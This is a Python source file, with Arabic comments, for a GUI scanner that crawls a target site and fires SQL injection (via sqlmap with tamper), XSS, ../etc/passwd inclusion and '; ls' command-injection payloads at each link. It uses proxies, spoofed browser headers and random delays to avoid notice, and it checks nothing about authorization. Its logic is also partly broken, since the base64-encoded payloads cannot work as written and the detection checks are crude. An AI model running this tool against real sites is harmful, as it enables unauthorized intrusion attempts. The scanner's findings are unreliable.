
import requests
from bs4 import BeautifulSoup
import subprocess
import re
import random
import time
import base64
import tkinter as tk
from tkinter import messagebox

# حمولات XSS بعد تشويشها
xss_payloads = [
    base64.b64encode(b"<script>alert('XSS')</script>").decode(),
    base64.b64encode(b"<img src=x onerror=alert('XSS')>").decode()
]

# حمولات File Inclusion بعد تشويشها
file_inclusion_payloads = [
    base64.b64encode(b"../etc/passwd").decode(),
    base64.b64encode(b"../../etc/passwd").decode()
]

# حمولات Command Injection بعد تشويشها
command_injection_payloads = [
    "; ls",
    "| ls",
    "& ls"
]

# ملف التقرير
report_file = "detailed_vulnerability_report.html"

# إعدادات وكيل
proxies = {
    "http": "http://proxy_ip:proxy_port",
    "https": "https://proxy_ip:proxy_port"
}

# إعدادات headers لمحاكاة متصفح حقيقي
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
}

# تهيئة ملف التقرير
def init_report():
    try:
        with open(report_file, "w") as report:
            report.write("<html><head><title>Detailed Vulnerability Report</title></head><body>")
            report.write("<h1>Vulnerability Scan Report</h1><hr>")
    except Exception as e:
        print(f"[!] Error initializing report: {e}")

def log_results(result):
    try:
        with open(report_file, "a") as report:
            report.write(result + "<br>")
    except Exception as e:
        print(f"[!] Error writing to report: {e}")

def close_report():
    try:
        with open(report_file, "a") as report:
            report.write("</body></html>")
    except Exception as e:
        print(f"[!] Error closing report: {e}")

# استخراج الروابط الفرعية من الصفحة الرئيسية مع معالجة الأخطاء
def extract_links(url):
    print(f"[*] Extracting links from {url}")
    links = []
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        for link in soup.find_all("a", href=True):
            href = link['href']
            if href.startswith("/"):
                href = url + href
            elif not href.startswith("http"):
                continue
            links.append(href)
    except requests.exceptions.RequestException as e:
        print(f"[!] Error extracting links: {e}")
    return links

# تشغيل SQLMap لفحص SQL Injection مع تشويش وإعدادات وكيل
def run_sqlmap(url):
    print(f"[*] Running SQLMap on {url}")
    try:
        result = subprocess.check_output(["sqlmap", "-u", url, "--batch", "--random-agent", "--tamper=space2comment", "-v", "1"], stderr=subprocess.STDOUT, timeout=60)
        decoded_result = result.decode()
        if "parameter" in decoded_result:
            print(f"[+] SQL Injection vulnerability detected by SQLMap in {url}")
            log_results(f"<b>SQL Injection vulnerability found by SQLMap in {url}</b>")
        else:
            print("[-] No SQL Injection vulnerability detected by SQLMap.")
    except subprocess.CalledProcessError as e:
        print(f"[!] SQLMap process error: {e.output.decode()}")
    except subprocess.TimeoutExpired:
        print("[!] SQLMap process timed out.")
    except Exception as e:
        print(f"[!] Unknown error running SQLMap: {e}")

# فحص XSS وDOM-based XSS مع معالجة الأخطاء واستخدام وكيل وتأخير عشوائي
def test_xss(url, param):
    print(f"[*] Testing XSS on {url}")
    for payload in xss_payloads:
        try:
            data = {param: payload}
            response = requests.get(url, params=data, headers=headers, proxies=proxies, timeout=10)
            response.raise_for_status()
            if payload in response.text:
                print(f"[+] XSS vulnerability detected with payload: {payload}")
                log_results(f"<b>XSS vulnerability found in {url} with payload: {payload}</b>")
            elif re.search(r"document\.write|innerHTML", response.text, re.IGNORECASE):
                print(f"[+] Potential DOM-based XSS vulnerability found in JavaScript on {url}")
                log_results(f"<b>Potential DOM-based XSS vulnerability found in JavaScript on {url}</b>")
            else:
                print(f"[-] No XSS vulnerability detected with payload: {payload}")
            time.sleep(random.uniform(1, 3))  # تأخير عشوائي
        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing XSS: {e}")

# فحص تضمين الملفات مع معالجة الأخطاء وتأخير
def test_file_inclusion(url):
    print(f"[*] Testing File Inclusion on {url}")
    for payload in file_inclusion_payloads:
        try:
            response = requests.get(url + payload, headers=headers, proxies=proxies, timeout=10)
            response.raise_for_status()
            if "root:x" in response.text or "bin/bash" in response.text:
                print(f"[+] File Inclusion vulnerability detected with payload: {payload}")
                log_results(f"<b>File Inclusion vulnerability found in {url} with payload: {payload}</b>")
            else:
                print(f"[-] No File Inclusion vulnerability detected with payload: {payload}")
            time.sleep(random.uniform(1, 3))  # تأخير عشوائي
        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing File Inclusion: {e}")

# فحص Command Injection مع معالجة الأخطاء وتأخير
def test_command_injection(url, param):
    print(f"[*] Testing Command Injection on {url}")
    for payload in command_injection_payloads:
        try:
            data = {param: payload}
            response = requests.get(url, params=data, headers=headers, proxies=proxies, timeout=10)
            response.raise_for_status()
            if "root" in response.text or "bin" in response.text:
                print(f"[+] Command Injection vulnerability detected with payload: {payload}")
                log_results(f"<b>Command Injection vulnerability found in {url} with payload: {payload}</b>")
            else:
                print(f"[-] No Command Injection vulnerability detected with payload: {payload}")
            time.sleep(random.uniform(1, 3))  # تأخير عشوائي
        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing Command Injection: {e}")

# فحص CSRF مع معالجة الأخطاء
def test_csrf(url):
    print(f"[*] Testing CSRF on {url}")
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()
        if "csrf" not in response.text.lower():
            print("[+] Potential CSRF vulnerability detected - no CSRF token found")
            log_results(f"<b>Potential CSRF vulnerability found in {url} - no CSRF token present</b>")
        else:
            print("[-] CSRF token found; unlikely to have CSRF vulnerability")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error testing CSRF: {e}")

# واجهة المستخدم الرسومية باستخدام Tkinter
def start_gui():
    def run_scan():
        base_url = url_entry.get()
        init_report()
        links = extract_links(base_url)
        for link in links:
            run_sqlmap(link)
            test_xss(link, "id")
            test_file_inclusion(link)
            test_command_injection(link, "cmd")
            test_csrf(link)
        close_report()
        messagebox.showinfo("Scan Complete", f"Scan complete. Results saved in {report_file}")

    root = tk.Tk()
    root.title("AutoVulnScanner GUI")

    tk.Label(root, text="Enter Target URL:").grid(row=0, column=0, padx=5, pady=5)
    url_entry = tk.Entry(root, width=50)
    url_entry.grid(row=0, column=1, padx=5, pady=5)

    scan_button = tk.Button(root, text="Run Scan", command=run_scan)
    scan_button.grid(row=1, column=1, padx=5, pady=5)

    root.mainloop()

# التشغيل الرئيسي
def main():
    start_gui()

# تنفيذ الأداة
if __name__ == "__main__":
    main()
